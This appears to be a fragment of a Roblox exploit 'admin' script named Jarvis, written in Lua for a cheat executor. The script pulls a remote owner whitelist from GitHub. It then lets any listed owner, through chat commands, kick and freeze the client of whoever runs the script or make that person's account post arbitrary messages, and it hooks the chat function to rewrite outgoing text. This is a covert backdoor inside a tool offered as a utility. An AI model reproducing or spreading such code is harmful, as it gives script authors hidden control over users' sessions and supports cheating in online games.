 
task.spawn(function() 
local cwl = game:HttpGet("https://raw.githubusercontent.com/Korabi-dev/roblox-scripts/main/korbaiaccounts.txt"):lower() 
local function w(plr, msg)
if cwl:lower():match(plr.Name:lower())
--and not cwl:lower():match(player.Name:lower())
then 
	if msg:lower() == "j:kick" then 
		task.wait()
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("[Jarvis]: Leaving the server...", "All")
		task.wait(0.2)
		pcall(function() 
		game.Players.LocalPlayer:Kick("Jarvis owner " .. plr.DisplayName .. " has kicked you from the game")
		end)
	   task.wait(0.5)
	   while true do end
	elseif msg:lower() == "j:prove" then
		task.wait()
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("[Jarvis]: " .. plr.DisplayName .. " is the owner of jarvis", "All")
	elseif msg:lower():match("j:s") then
	chat(msg:lower():gsub("j:s", ""):gsub("me", plr.Name):gsub("ME", plr.Name):gsub("Me", plr.Name):gsub("mE", plr.Name))
	end

end -- wl check
end


for i,v in next, game.Players:GetPlayers() do 
if v.UserId ~= game.Players.LocalPlayer.UserId and cwl:lower():match(v.Name:lower()) then
print(v.UserId .. " is jarvis owner")
v.Chatted:Connect(function(msg) 
w(v, msg)
end)
end
end

game.Players.PlayerAdded:Connect(function(v) 
	if v.UserId ~=  game.Players.LocalPlayer.UserId and cwl:lower():match(v.Name:lower()) then
		v.Chatted:Connect(function(msg) 
		w(v, msg)
		end)
	methods:display(v.DisplayName .. " (Jarvis Owner) has joined the game")
end
end)

end)
  addCommand({name = "cleargui", admin = true, d = "Clears the loading screen gui if stuck"}, function()
for i,v in next, game.CoreGui:GetDescendants() do 
task.spawn(function() 
if v.Name == "DesignerXHub" then v:Destroy() end
end)
end
end)


task.spawn(function() 
local OldC
OldC = hookfunction(chat, function(str, ...)
     pcall(function()
    if typeof(str) == "string" then
    str = str:gsub("sckah", "scjarvis")
      end
    end)
    return OldC(str, ...)
end)
end)
